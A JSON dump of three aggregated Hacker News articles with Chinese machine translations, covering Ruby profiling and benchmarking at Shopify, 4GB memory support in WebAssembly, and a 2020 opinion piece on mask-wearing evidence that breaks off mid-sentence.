[{"category": "", "categoryclass": "", "imagename": "c310b9d142a9902f8a81aab324549741.jpg", "infoid": 1002120, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Jay Lim和Gannon McGibbonat Shopify，我们相信高度一致、松散耦合的团队可以帮助我们快速行动。由于我们有许多团队独立开发大型单块Rails应用程序，代码效率低下有时会不经意间添加到我们的代码库中。随着时间的推移，这些问题会导致严重的性能倒退。当这种性能倒退明显时，追踪违规提交可能已经为时已晚。这对代码库来说可能是非常具有挑战性的，因为每天都要提交数千个更改。我们如何有效地找出应用程序运行缓慢的原因呢？即使我们已经修复了速度较慢的代码，我们如何才能证明我们的新代码更快呢？这一切都始于性能分析和基准测试。去年，我们写了关于用Ruby on rails编写快速代码的文章。知道如何编写快速代码是有用的，但如果不知道如何修复速度较慢的代码，则是不够的。让我们讨论一下我们可以用来查找、修复慢代码的方法，并证明我们的新解决方案更快。我们还将探索一些案例研究，这些案例研究以使用性能分析和基准测试的真实示例为特色。性能分析在我们开始修复性能不佳的代码之前，我们需要首先找到它。在大型代码库中，识别导致性能瓶颈的代码可能具有挑战性。分析帮助我们很容易做到这一点。什么是分析？分析是一种程序分析类型，它在运行时收集有关程序的度量，如方法调用的频率和持续时间。它是使用一种称为分析器的工具执行的，分析器的输出可以通过各种方式可视化。例如，平面配置文件、调用图和火焰图。为什么要分析我的代码？仅通过查看代码(静态分析、代码审查等)来检测某些问题很有挑战性。剖析的主要目标之一是可观察性。通过了解运行时幕后发生的情况，我们可以更好地理解程序在做什么，并解释应用程序运行缓慢的原因。分析帮助我们将性能瓶颈的范围缩小到特定区域。我如何分析？在我们确定要分析什么之前，我们需要首先弄清楚我们想知道的是：我们是要测量特定代码块的运行时间，还是要测量该代码块中的对象分配？就粒度而言，我们是否需要代码块中每个方法调用所用的时间，或者我们只需要聚合值？这里的运行时间可以进一步细分为CPU时间或挂起时间，要测量运行时间，一个简单的解决方案是测量特定代码块的开始时间和结束时间，并报告差异。如果我们需要更高的粒度，我们对每个方法都这样做。为此，我们使用Ruby中的TracePoint API来挂钩Ruby进行的每个方法调用。类似地，对于对象分配，我们使用ObjectSpace分析器模块来跟踪对象分配，甚至转储Ruby堆以观察其内容。但是，我们可以使用现有的一个可用的分析器，而不是构建定制的分析器解决方案，每个分析器都有自己的优点和缺点。这里有几个选项：1.rbspyrbspy示例随时间推移来自Ruby进程的堆栈框架。它的主要优点是可以作为独立的程序使用，而不需要任何检测代码。一旦我们知道了要评测的Ruby进程标识符(PID)，我们就像这样启动评测会话：rbspy record-PID$PID2。与rbspy类似，stackprof示例随着时间的推移堆叠帧，但是来自一段插入指令的Ruby代码。Stackprof用作自定义代码块的分析解决方案：profile=StackProf.run(mode：：cpu)do#Code to profileend3。机架-迷你Profiler机架-迷你Profiler GEM是一款功能齐全的基于机架的应用程序评测解决方案。与本节中描述的其他分析器不同，除了调用堆栈采样之外，它还包括一个内存分析器。内存分析器收集诸如垃圾收集(GC)统计数据、分配数量等数据。在幕后，它使用stackprof和memory_profiler。4.。app_profilerapp_profiler是Rack-mini-Profiler的轻量级替代方案。它包含一个仅限机架的中间件，支持Web请求的调用堆栈分析。除此之外，块级分析也可用于任何Ruby应用程序。这些配置文件可存储在可配置存储后端(如Google云存储)中，并可通过可配置查看器(如基于浏览器的火焰图查看器Speedscope)进行可视化。在Shopify，我们收集生产环境中的性能配置文件。Rack Mini Profiler是一个很棒的工具，但是它有很多额外的功能，比如数据库和内存分析，对于我们的用例来说，它似乎太重了。因此，我们构建了App Profiler，它在幕后类似地使用Stackprof。目前，此GEM用于支持我们的按需远程评测I", "note_en": "By Jay Lim and Gannon McGibbonAt Shopify, we believe in highly aligned, loosely coupled teams to help us move fast. Since we have many teams working independently on a large monolithic Rails application, inefficiencies in code are sometimes inadvertently added to our codebase. Over time, these problems can add up to serious performance regressions.By the time such performance regressions are noticeable, it might already be too late to track offending commits down. This can be exceedingly challenging on codebases with thousands of changes being committed each day. How do we effectively find out why our application is slow? Even if we have a fix for the slow code, how can we prove that our new code is faster?It all starts with profiling and benchmarking. Last year, we wrote about writing fast code in Ruby on Rails. Knowing how to write fast code is useful, but insufficient without knowing how to fix slow code. Let’s talk about the approaches that we can use to find slow code, fix it, and prove that our new solution is faster. We’ll also explore some case studies that feature real world examples on using profiling and benchmarking.ProfilingBefore we dive into fixing unperformant code, we need to find it first. Identifying code that causes performance bottlenecks can be challenging in a large codebase. Profiling helps us to do so easily.What is Profiling?Profiling is a type of program analysis that collects metrics about the program at runtime, such as the frequency and duration of method calls. It’s carried out using a tool known as a profiler, and a profiler’s output can be visualized in various ways. For example, flat profiles, call graphs, and flamegraphs.Why Should I Profile My Code?Some issues are challenging to detect by just looking at the code (static analysis, code reviews, etc.). One of the main goals of profiling is observability. By knowing what is going on under the hood during runtime, we gain a better understanding of what the program is doing and reason about why an application is slow. Profiling helps us to narrow down the scope of a performance bottleneck to a particular area.How Do I Profile?Before we figure out what to profile, we need to first figure out what we want to know: do we want to measure elapsed time for a specific code block, or do we want to measure object allocations in that code block? In terms of granularity, do we need elapsed time for every single method call in that code block, or do we just need the aggregated value? Elapsed time here can be further broken down into CPU time or wall time.For measuring elapsed time, a simple solution is to measure the start time and the end time of a particular code block, and report the difference. If we need a higher granularity, we do this for every single method. To do this, we use the TracePoint API in Ruby to hook into every single method call made by Ruby. Similarly, for object allocations, we use the ObjectSpace module to trace object allocations, or even dump the Ruby heap to observe its contents.However, instead of building custom profiling solutions, we can use one of the available profilers out there, and each has its own advantages and disadvantages. Here are a few options:1. rbspyrbspy samples stack frames from a Ruby process over time. The main advantage is that it can be used as a standalone program without needing any instrumentation code.Once we know the Ruby Process Identifier (PID) that we want to profile, we start the profiling session like this:rbspy record —pid $PID2. stackprofLike rbspy, stackprof samples stack frames over time, but from a block of instrumented Ruby code. Stackprof is used as a profiling solution for custom code blocks:profile = StackProf.run(mode: :cpu) do  # Code to profileend3. rack-mini-profilerThe rack-mini-profiler gem is a fully-featured profiling solution for Rack-based applications. Unlike the other profilers described in this section, it includes a memory profiler in addition to call-stack sampling. The memory profiler collects data such as Garbage Collection (GC) statistics, number of allocations, etc. Under the hood, it uses the stackprof and memory_profiler gems.4. app_profilerapp_profiler is a lightweight alternative to rack-mini-profiler. It contains a Rack-only middleware that supports call-stack profiling for web requests. In addition to that, block level profiling is also available to any Ruby application. These profiles can be stored in a configurable storage backend such as Google Cloud Storage, and can be visualized through a configurable viewer such as Speedscope, a browser-based flamegraph viewer.At Shopify, we collect performance profiles in our production environments. Rack Mini Profiler is a great gem, but it comes with a lot of extra features such as database and memory profiling, and it seemed too heavy for our use case. As a result, we built App Profiler that similarly uses Stackprof under the hood. Currently, this gem is used to support our on-demand remote profiling infrastructure for production requests.Case Study: Using App Profiler on ShopifyAn example of a performance problem that was identified in production was related to unnecessary GC cycles. Last year, we noticed that a cart item with a very large quantity used a ridiculous amount of CPU time and resulted in slow requests. It turns out, the issue was related to Ruby allocating too many objects, triggering the GC multiple times.The figure below illustrates a section of the flamegraph for a similar slow request, and the section corresponds to approximately 500ms of CPU time.A section of the flamegraph for a similar slow requestThe highlighted chunks correspond to the GC operations, and they interleave with the regular operations. From this section, we see that GC itself consumed about 35% of CPU time, which is a lot! We inferred that we were allocating too many Ruby objects. Without profiling, it’s difficult to identify these kinds of issues quickly.BenchmarkingNow that we know how to identify performance problems, how do we fix them? While the right solution is largely context sensitive, validating the fix isn’t. Benchmarking helps us prove performance differences in two or more different code paths.What is Benchmarking?Benchmarking is a way of measuring the performance of code. Often, it’s used to compare two or more similar code paths to see which code path is the fastest. Here’s what a simple ruby benchmark looks like:This code snippet is benchmarking at its simplest. We’re measuring how long a method takes to run in seconds. We could extend the example to measure a series of methods, a complex math equation, or anything else that fits into a block. This kind of instrumentation is useful because it can unveil regression or improvement in speed over time.While wall time is a pretty reliable measurement of “performance”, there’s other methods one can measure code by besides realtime, the Ruby standard library’s Benchmark module includes bm and bmbm.The bm method shows a more detailed breakdown of timing measurements. Let’s take a look at a script with some output:User, system, and total are all different measurements of CPU time. User refers to time spent working in user space. Similarly, system denotes time spent working in kernel space. Total is the sum of CPU timings, and real is the same wall time measurement we saw from Benchmark.realtime.What about bmbm? Well, it is exactly the same as bm with one unique difference. Here’s what the output looks like:The rehearsal, or warmup step is what makes bmbm useful. It runs benchmark code blocks once before measuring to prime any caching or similar mechanism to produce more stable, reproducible results.Lastly, let’s talk about the benchmark-ips gem. This is the most common method of benchmarking Ruby code. You’ll see it a lot in the wild, this is what a simple script looks like:Here, we’re benchmarking the same method using familiar syntax with ips method. Notice the inline bundler and gemfile code. We need this in a scripting context because benchmark-ips isn’t part of the standard library. In a normal project setup, we add gem entries to the Gemfile as usual.The output of this script is as follows:Ignoring the bundler output, we see the warmup iteration score per 100 milliseconds ran for the default of 2 seconds, and how many times the code block was able to run in 5 seconds. It’ll become more apparent why benchmark-ips is so popular later.Why Should I Benchmark My Code?So, now we know what benchmarking is and some tools available to us. But why even bother benchmarking at all? It may not be immediately obvious why benchmarking is so valuable.Benchmarks are used to quantify the performance of one or more blocks of code. This becomes very useful when there are performance questions that need answers. Often, these questions boil down to “which is faster, A or B?”. Let’s look at an example:In this script, we’re doing most of what we did in the first benchmark-ips example. Pay attention to the addition of another method, and how it changes the benchmark block. When benchmarking more than one thing at once, simply add another report block. Additionally, the compare! method prints a comparison of all reports:Wow, that’s pretty snazzy! compare! is able to tell us which benchmark is slower and by how much. Given the amount of thread sleeping we’re doing in our benchmark subject methods, this aligns with our expectations.Benchmarking can be a means of proving how fast a given code path is. It’s not uncommon for developers to propose a code change that makes a code path faster without any evidence.Depending on the change, comparison can be challenging. As in the previous example, benchmark-ips may be used to benchmark individual code paths. Running the same single report benchmark on versions of code easily tests pre and post patch performance.How Do I Benchmark My Code?Now we know what benchmarking is and why it is important. Great! But how do you get started benchmarking in an application? Trivial examples are easy to learn from but aren’t very relatable.When developing in a framework like Ruby on Rails, it can be difficult to understand how to set up and load framework code for benchmark scripts. Thankfully, one of the latest features of Ruby on Rails can generate benchmarks automatically. Let’s take a look:This benchmark can be generated by running bin/rails generate benchmark my_benchmark, placing a file in script/benchmarks/my_benchmark.rb. Note the inline gemfile isn’t required because we piggyback off of the Rails app’s Gemfile. The benchmark generator is slated for release in Rails 6.1.Now, let’s look at a real world example of a Rails benchmark:In this example, we’re subclassing Order and caching the calculation it does to find the total price of all line items. While it may seem obvious that this would be a beneficial code change, it isn’t obvious how much faster it is compared to the base implementation. Here’s a more unabridged version of the script for full context.Running the script reveals a ~50x improvement to a simple order of 4 line items. With orders with more line items, the payoff only gets better.One last thing to know about benchmarking effectively is being aware of micro-optimization. These are optimizations that are so small, the performance improvement isn’t worth the code change. While these are sometimes acceptable for hot code paths, it’s best to tackle larger scale performance issues first.Case Study: Rails ContributionsAs with many open source projects, Ruby on Rails usually requires performance optimization pull requests to include benchmarks. The same is common for new features to performance sensitive areas like Active Record query building or Active Support’s cache stores. In the case of Rails, most benchmarks are made with benchmark-ips to simplify comparison.For example, https://github.com/rails/rails/pull/36052 changes how primary keys are accessed in Active Record instances. Specifically, refactoring class method calls to instance variable references. It includes before and after benchmark results with a clear explanation of why the change is necessary.https://github.com/rails/rails/pull/38401 changes model attribute assignment in Active Record so that key stringification of attribute hashes is no longer needed. A benchmark script with multiple scenarios is provided with results. This is a particularly hot codepath because creating and updating records is at the heart of most Rails apps.Another example, https://github.com/rails/rails/pull/34197 reduces object allocations in ActiveRecord#respond_to?. It provides a memory benchmark that compares total allocations before and after the patch, with a calculated diff. Reducing allocations delivers better performance because the less Ruby allocates, the less time Ruby spends assigning objects to blocks of memory.Final ThoughtsSlow code is an inevitable facet of any codebase. It isn’t important who introduces performance regressions, but how they are fixed. As developers, it’s our job to leverage profiling and benchmarking to find and fix performance problems.At Shopify, we’ve written a lot of slow code, often for good reasons. Ruby itself is optimized for the developer, not the servers we run it on. As Rubyists, we write idiomatic, maintainable code that isn’t always performant, so profile and benchmark responsibly, and be wary of micro-optimizations!Additional InformationBenchmarking and Profiling 101Ruby Performance ToolsIf this sounds like the kind of problems you want to solve, we're always on the lookout for talent and we’d love to hear from you. Visit our Engineering career page to find out about our open positions. Learn about the actions we’re taking as we continue to hire during COVID‑19   ", "posttime": "2020-05-15 01:39:14", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "ruby,代码,速度慢,slow", "title": "如何在Ruby中修复速度慢的代码", "title_en": "How to Fix Slow Code in Ruby", "transed": 1, "url": "https://engineering.shopify.com/blogs/engineering/how-fix-slow-code-ruby", "via": "", "real_tags": ["ruby", "代码", "速度慢", "slow"]}, {"category": "", "categoryclass": "", "imagename": "", "infoid": 1002119, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "多亏了Chrome和Emscripten最近的工作，你现在可以在WebAssembly应用程序中使用高达4 GB的内存。这比之前2 GB的限制要高。这看起来可能有点奇怪--毕竟，让人们使用512MB或1 GB内存不需要任何工作！--但事实证明，在从2 GB到4 GB的跃升过程中，浏览器和工具链中都发生了一些特殊的事情，我们将在本文中描述这一点。在我们进入更多细节之前，先了解一些背景知识：新的4 GB限制是使用32位指针可能获得的最大内存量，这也是WebAssembly目前支持的，在LLVM和其他地方称为“wam32”。我们正在努力实现一种“wam64”(wasm规范中的“内存64”)，其中指针可以是64位的，并且我们将能够使用超过1600万TB的内存(！)，但是在此之前，我们最多希望能够访问的是4 GB。似乎我们应该始终能够访问4 GB，因为这是32位指针所允许的。那么为什么我们被限制在这个数字的一半，只有2 GB呢？浏览器和工具链端都有多种原因。让我们从浏览器开始。原则上，V8中的更改听起来很简单：只需确保为WebAssembly函数生成的所有代码以及所有内存管理代码都使用无符号32位整数作为内存索引和长度，我们就应该完成工作。然而，在实践中，还有更多的事情要做！由于WebAssembly内存可以作为ArrayBuffer导出到JavaScript，因此我们还必须更改JavaScript ArrayBuffers、TypedArray以及所有使用ArrayBuffers和TypedArray的Web API的实现，如Web Audio、WebGPU和WebUSB。我们必须解决的第一个问题是，V8使用SMI(即31位有符号整数)作为TypedArray索引和长度，因此最大大小实际上是230-1，即大约1 GB。此外，事实证明，将所有内容都转换为32位整数是不够的，因为4 GB内存的长度实际上不适合32位整数。举例说明：在十进制数中，有100个数字有两位数(0到99)，但是&#34；100&#34；本身就是一个三位数。类似地，4 GB可以用32位地址寻址，但4 GB本身就是33位数字。我们本可以满足于稍微低一点的限制，但是由于我们无论如何都要接触所有的TypedArray代码，所以我们想让它为将来更大的限制做好准备。因此，我们更改了所有处理TypedArray索引或长度的代码，以便在需要与JavaScript接口的情况下使用64位宽的整数类型或JavaScript数字。作为一个额外的好处，这意味着现在支持wam64的更大内存应该是相对简单的！第二个挑战是处理JavaScript对Array元素的特殊大小写，而不是常规命名属性，这反映在我们的对象实现中。(这是一个与JavaScript规范有关的相当技术性的问题，所以如果您没有遵循所有细节，请不要担心。)。考虑这个例子：如果array是一个纯JavaScript对象或Array，那么数组[5_000_000_000]将作为基于字符串的属性查找来处理。运行库将查找以字符串命名的属性“5000000000”。如果找不到这样的属性，它将沿着原型链向上遍历并查找该属性，或者最终在链的末尾返回UNDEFINED。但是，如果数组本身或其原型链上的对象是TypedArray，则运行库必须在索引5,000,000,000处查找索引元素，或者如果此索引超出界限，则立即返回UNDEFINED。换句话说，TypedArray的规则与普通数组有很大的不同，这种差异主要表现在索引很大的情况下。因此，只要我们只允许较小的TypedArray，我们的实现就可以相对简单；特别是，只需查看属性键一次就足以决定是应该采用索引路径还是名称为&#34；的查找路径。为了允许更大的TypedArray，我们现在必须在沿着原型链向上移动时重复进行这种区分，这需要仔细的缓存，以避免由于重复工作和开销而降低现有JavaScript代码的速度。在工具链端，我们也必须做工作，大部分工作都在JavaScript支持代码上，而不是WebAssembly中的编译代码上。主要问题是Emscripten总是以这种形式写入内存访问：即从地址PTR+OFFSET读取32位(4字节)作为带符号整数。其工作原理是HEAP32是一个Int32Array，这意味着数组中的每个索引都有4个字节。因此，我们需要将字节地址(PTR+OFFSET)除以4来得到索引，这就是&gt；&gt；2所做的。问题是&gt；&gt；是签名操作！如果地址在2 GB或更高，则会将输入溢出为负数：//略低于2 GB即可，这将打印536870911控制台。日志((2*1", "note_en": "Thanks to recent work in Chrome and Emscripten, you can now use up to 4GB of memory in WebAssembly applications. That’s up from the previous limit of 2GB. It might seem odd that there was ever a limit - after all, no work was needed to allow people to use 512MB or 1GB of memory! - but it turns out that there are some special things happening in the jump from 2GB to 4GB, both in the browser and in the toolchain, which we’ll describe in this post.  Some background before we get into more details: the new 4GB limit is the largest amount of memory possible with 32-bit pointers, which is what WebAssembly currently supports, known as “wasm32” in LLVM and elsewhere. There is work towards a “wasm64” ( “memory64” in the wasm spec) in which pointers can be 64-bit and we would be able to make use of over 16 million terabytes of memory (!), but until then, 4GB is the most we can possibly hope to be able to access. It seems like we should always have been able to access 4GB, since that’s what 32-bit pointers allow. Why then have we been limited to half that, just 2GB? There are multiple reasons, on both the browser and the toolchain side. Let’s start with the browser.  In principle the changes in V8 sound simple: Just make sure that all code generated for WebAssembly functions, as well as all memory management code, uses unsigned 32-bit integers for memory indices and lengths, and we should be done. However, in practice, there&#39;s more to it than that! As WebAssembly memory can be exported to JavaScript as an ArrayBuffer, we also had to change the implementation of JavaScript ArrayBuffers, TypedArrays, and all Web APIs that use ArrayBuffers and TypedArrays, like Web Audio, WebGPU, and WebUSB. The first issue we had to solve was that V8 used  Smis (i.e. 31 bit signed integers) for TypedArray indices and lengths, so the maximum size was actually 2 30-1, or about 1GB. Additionally, it turns out that switching everything to 32-bit integers would not be enough, because the length of a 4GB memory actually does not fit into a 32-bit integer. To illustrate: in decimal, there are 100 numbers with two digits (0 through 99), but &#34;100&#34; itself is a three-digit number. Analogously, 4GB can be addressed with 32-bit addresses, but 4GB itself is a 33-bit number. We could have settled for a slightly lower limit, but as we had to touch all the TypedArray code anyway, we wanted to prepare it for even bigger future limits while we were at it. So we changed all code that deals with TypedArray indices or lengths to use 64-bit wide integer types, or JavaScript Numbers where interfacing with JavaScript is required. As an added benefit, this means that supporting even larger memories for wasm64 should be relatively straightforward now! A second challenge was dealing with JavaScript&#39;s special-casing for Array elements, compared to regular named properties, which is reflected in our implementation of objects. (This is a rather technical issue to do with the JavaScript spec, so don’t worry if you don’t follow all the details.) Consider this example:  If  array is a plain JavaScript object or Array, then  array[5_000_000_000] would be handled as a string-based property lookup. The runtime would look for a string-named property “5000000000”. If no such property can be found, it would walk up the prototype chain and look for that property, or eventually return  undefined at the end of the chain. However, if  array itself, or an object on its prototype chain, is a TypedArray, then the runtime must look for an indexed element at the index 5,000,000,000, or immediately return  undefined if this index is out of bounds. In other words, the rules for TypedArrays are quite different from normal Arrays, and the difference mostly manifests for huge indices. So as long as we only allowed smaller TypedArrays, our implementation could be relatively simple; in particular, looking at the property key just once was enough to decide whether the &#34;indexed&#34; or the &#34;named&#34; lookup path should be taken. To allow larger TypedArrays, we now have to make this distinction repeatedly as we walk up the prototype chain, which requires careful caching to avoid slowing down existing JavaScript code through repeated work and overhead.  On the toolchain side we had to do work as well, most of it on the JavaScript support code, not the compiled code in WebAssembly. The main issue was that Emscripten has always written memory accesses in this form:  That reads 32 bits (4 bytes) as a signed integer from address  ptr + offset. How this works is that  HEAP32 is an Int32Array, which means that each index in the array has 4 bytes. So we need to divide the byte address ( ptr + offset) by 4 to get the index, which is what the  &gt;&gt; 2 does. The problem is that  &gt;&gt; is a  signed operation! If the address is at the 2GB mark or higher, it will overflow the input into a negative number: // Just below 2GB is ok, this prints 536870911  console . log ( ( 2  *  1024  *  1024  *  1024  -  4 )  &gt;&gt;  2 ) ;   // 2GB overflows and we get -536870912 :(  console . log ( ( 2  *  1024  *  1024  *  1024 )  &gt;&gt;  2 ) ;\n The solution is to do an  unsigned shift,  &gt;&gt;&gt;: // This gives us 536870912, as we want!  console . log ( ( 2  *  1024  *  1024  *  1024 )  &gt;&gt;&gt;  2 ) ;\n Emscripten knows at compile time whether you may use 2GB or more memory (depending on the flags you use; see later for details). If your flags make 2GB+ addresses possible then the compiler will automatically rewrite all memory accesses to use  &gt;&gt;&gt; instead of  &gt;&gt;, which includes not just  HEAP32 etc. accesses as in the examples above but also operations like  .subarray() and  .copyWithin(). In other words, the compiler will switch to use unsigned pointers instead of signed ones. This transformation increases code size a little bit - one extra character in each shift - which is why we don’t do it if you aren’t using 2GB+ addresses. While the difference is typically less than 1%, it’s just unnecessary, and easy to avoid - and lots of small optimizations add up! Other rare issues can arise in JavaScript support code. While normal memory accesses are handled automatically as described earlier, doing something like manually comparing a signed pointer to an unsigned one will (on address 2GB and above) return false. To find such issues we’ve audited Emscripten’s JavaScript and also run the test suite in a special mode where everything is placed at address 2GB or higher. (Note that if you write your own JavaScript support code you may have things to fix there as well, if you do manual things with pointers aside from normal memory accesses.)  To test this,  get the latest Emscripten release, or at least version 1.39.15. Then build with flags such as  Those enable memory growth, and allow the program to allocate all the way up to 4GB of memory. Note that by default you will only be able to allocate up to 2GB - you must explicitly opt in to using 2-4GB (this allows us to emit more compact code otherwise, by emitting  &gt;&gt; instead of  &gt;&gt;&gt; as mentioned above). Make sure to test on Chrome M83 (currently in Beta) or later. Please file issues if you find anything wrong!  Support for up to 4GB memory is another step in making the web as capable as native platforms, allowing 32-bit programs to be able to use just as much memory as they would normally. By itself this doesn’t enable a completely new class of application, but it does enable higher-end experiences, such as a very large level in a game or manipulating large content in a graphical editor. As mentioned earlier, support for 64-bit memory is also planned, which will allow accessing even more than 4GB. However, wasm64 will have the same downside as 64-bit does on native platforms, that pointers take twice as much memory. That’s why 4GB support in wasm32 is so important: We can access twice as much memory as before while code size remains as compact as wasm has always been! As always, test your code on multiple browsers, and also remember that 2-4GB is a lot of memory! If you need that much you should use it, but don’t do so unnecessarily since there just won’t be enough free memory on many users’ machines. We recommend that you start with an initial memory that is as small as possible, and grow if necessary; and if you allow growth, gracefully handle the case of a  malloc() failure.", "posttime": "2020-05-15 01:38:44", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "webassembly,内存,memory,javascript", "title": "WebAssembly中最高可配4 GB内存", "title_en": "Up to 4GB of Memory in WebAssembly", "transed": 1, "url": "https://v8.dev/blog/4gb-wasm-memory", "via": "", "real_tags": ["内存", "memory"]}, {"category": "", "categoryclass": "", "imagename": "dbf8291f999cb522f612860da4ee4b01.jpeg", "infoid": 1002118, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "我是旧金山大学的一名数据科学家，在网上为Fast.ai教授机器学习方面的课程。3月下旬，我决定用公开戴口罩作为案例研究，向我的学生展示如何结合和分析不同类型的数据和证据。\n令我吃惊的是，我发现在公共场合戴口罩的证据非常充分。看来，普遍戴口罩可能是应对冠状病毒传播的最重要工具之一。然而，我周围的人没有戴口罩，美国的卫生组织也不推荐使用口罩。\n我和其他18位来自不同学科的专家一起，对公众佩戴口罩作为减缓SARS-CoV-2传播的工具的研究进行了审查。我们在4月12日发表了我们论文的预印本，现在正在等待“美国国家科学院院刊”的同行评审。\n5月14日，我和100名世界顶尖学者向所有美国州长发表了一封公开信，要求“官员们要求在所有公共场所，如商店、交通系统和公共建筑，都必须佩戴口罩。”\n目前，美国疾病控制和预防中心建议每个人都戴口罩-覆盖世界90%人口的政府也是如此-但到目前为止，美国只有12个州要求戴口罩。在剩下的大多数州，疾控中心的建议还不够：大多数人目前没有戴口罩。然而，情况正在迅速变化。每周都有越来越多的司法管辖区要求在公共场合使用口罩。在我写这篇文章的时候，现在已经有94个国家采取了这一举措。\n那么，是什么证据让我和这么多科学家如此坚定地相信口罩呢？\n第一次让我相信的研究是一项激光散射实验。来自美国国立卫生研究院的研究人员使用激光照明并计算一个人在戴和不戴口罩的情况下，向空气中抛出了多少唾液滴。这篇论文最近才正式发表，但我在YouTube上看到了3月初的一段实验视频。结果在视频中非常明显。当研究人员使用简单的布面罩时，几乎所有的液滴都被阻挡了。\n只有当冠状病毒通过人嘴里的飞沫传播时，这一证据才是相关的。它是。有许多记录在案的超级传播案例与活动有关-比如在封闭的空间里唱歌-产生了大量的飞沫。\n光散射实验看不到小于5微米的“微滴”，可能含有一些病毒颗粒。但专家们认为这些并不是冠状病毒传播的主要原因。\n虽然这些小颗粒在传播过程中到底起到了多大的作用还有待观察，但最近的研究表明，布口罩在减少这些小颗粒的扩散方面也是有效的。在一篇尚未经过同行审查的论文中，研究人员发现，微滴从距离戴口罩的人1.5米的空气中坠落，而不戴口罩的人只有5米。当与社会距离相结合时，这表明口罩可以有效地减少通过微滴传播。\n另一项最近的研究表明，不合适的医用口罩在阻止呼吸过程中喷出的飞沫中的季节性冠状病毒方面是100%有效的。\n如果只有有症状的人感染其他人，那么只有有症状的人才需要戴口罩。但专家表明，没有症状的人有感染他人的风险。事实上，最近的四项研究表明，近一半的患者是由本身没有症状的人感染的。\n在我看来，这一证据似乎简单明了：冠状病毒是通过飞沫传播的。我们可以直接看到，一块布可以阻挡这些液滴和这些液滴包含的病毒。没有症状的人甚至不知道自己生病了，他们要为大约一半的病毒传播负责。\n在3月底和4月初看完所有这些强有力的证据后，我想知道为什么戴口罩在西方世界的卫生组织中有争议。美国和欧洲疾控中心不推荐口罩，除了斯洛伐克和捷克之外，几乎任何西方政府都不推荐口罩，这两个国家在3月下旬都要求戴口罩。\n第一个问题是，大多数研究人员都在研究错误的问题-口罩对佩戴者的保护作用如何，而不是口罩对感染者传播病毒的预防作用有多好。口罩的功能与个人防护装备(PPE)和源头控制截然不同。\n口罩在阻挡较大的液滴方面非常出色，但在阻挡微小颗粒方面则差得很远。当一个人把液滴排入空气中时，它们会迅速蒸发和收缩，成为空气中的微小颗粒，称为液滴核。这些东西很难从空气中去除。然而，在人的嘴巴和口罩之间潮湿的大气中，液滴蒸发并收缩成液滴核所需的时间几乎是前者的100倍。\n这意味着几乎任何一种简单的布料遮罩都可以很好地进行源代码控制。口罩产生湿度，这种湿度阻止含有病毒的液滴变成液滴核，这使得口罩的织物可以阻挡液滴。\n不幸的是，在这场大流行开始时，几乎所有可用的研究都集中在作为个人防护用品的口罩功效上。这一措施对于保护卫生保健工作者非常重要，但并不能体现他们作为源头控制的价值。2月29日，美国卫生局局长在推特上表示，口罩“在防止普通公众感染#冠状病毒方面效果不佳”。这忽略了关键的一点：正如我们对文献的回顾所显示的那样，它们在防止它的传播方面非常有效。\n第二个问题是，大多数医学研究人员习惯于在随机对照试验的基础上判断干预措施。这些都是循证医学的基础。然而，在大流行期间测试戴口罩、洗手或社交距离是不可能的，也是不道德的。\n像Trisha Greenhalgh这样的专家，畅销教科书“如何阅读一篇论文：循证医疗基础”的作者，现在问道，“冠状病毒是循证医学的死对头吗？”她和其他人建议，当一个简单的实验找到支持干预的证据，并且干预的负面影响有限时，政策制定者应该在随机试验完成之前采取行动。\n第三个问题是世界各地的医用口罩短缺。许多政策制定者担心，向公众推荐面罩会导致人们囤积医用口罩。这导致了似乎相互矛盾的指导方针，疾控中心表示，公众没有理由戴口罩，但需要为医务人员保留口罩。疾控中心现在已经澄清了立场，并建议公众使用自制口罩，同时为医疗专业人员保留较高等级的口罩。\n有大量研究表明，如果80%的人在公共场合戴上口罩，那么冠状病毒的传播就可以被阻止。在发现冠状病毒疫苗或治愈方法之前，布面口罩可能是我们目前抗击这种流行病的最重要工具。\n考虑到所有的实验室和流行病学证据，戴口罩的成本低-不需要工具就可以在家里制作-以及大规模使用有可能减缓冠状病毒的传播，政策制定者应该确保每个人在公共场合都戴上口罩。\n[您需要了解冠状病毒大流行，我们可以提供帮助。阅读对话的时事通讯。]", "note_en": "I’m a  data scientist at the University of San Francisco and teach courses online in machine learning for  fast.ai. In late March, I decided to use public mask-wearing as a case study to show my students how to combine and analyze diverse types of data and evidence.\n Much to my surprise, I discovered that the evidence for wearing masks in public was very strong. It appeared that universal mask-wearing could be one of the most important tools in tackling the spread of COVID-19. Yet the people around me weren’t wearing masks and health organizations in the U.S. weren’t recommending their use.\n I, along with 18 other experts from a variety of disciplines, conducted a review of the research on public mask-wearing as a tool to slow the spread SARS-CoV-2. We published a preprint of  our paper on April 12 and it is now awaiting peer review at the  Proceedings of the National Academy of Sciences.\n  On May 14, I and 100 of the world’s top academics released an  open letter to all U.S. governors asking that “officials  require cloth masks to be worn in all public places, such as stores, transportation systems, and public buildings.”\n Currently, the U.S. Centers for Disease Control and Prevention recommends that everyone wears a mask – as do the governments covering 90% of the world’s population – but, so far, only 12 states in the U.S. require it. In the majority of the remaining states, the CDC recommendation has not been enough: Most people  do not currently wear masks. However, things are changing fast. Every week more and more jurisdictions require mask use in public. As I write this, there are now  94 countries that have made this move.\n So what is this evidence that has led myself and so many scientists to believe so strongly in masks?\n   The research that first convinced me was a  laser light-scattering experiment. Researchers from the  National Institutes of Health used lasers to illuminate and count how many droplets of saliva were flung into the air by a person talking with and without a face mask. The paper was only recently published officially, but I saw a  YouTube video showing the experiment in early March. The results are shockingly obvious in the video. When the researcher used a simple cloth face cover, nearly all the droplets were blocked.\n This evidence is only relevant if COVID-19 is transmitted by droplets from a person’s mouth.  It is. There are many documented super-spreading cases connected with activities – like  singing in enclosed spaces – that create a  lot of droplets.\n The light-scattering experiment cannot see “micro-droplets” that are smaller than 5 microns and could contain some viral particles. But experts don’t think that these are  responsible for much COVID-19 transmission.\n While just how much of a role these small particles play in transmission remains to be seen, recent research suggests that cloth masks are also effective at reducing the spread of these smaller particles. In a paper that has not yet been peer-reviewed, researchers found that micro-droplets fell out of the air within  1.5 meters of the person who was wearing a mask, versus 5 meters for those not wearing masks. When combined with social distancing, this suggests that masks can effectively reduce transmission via 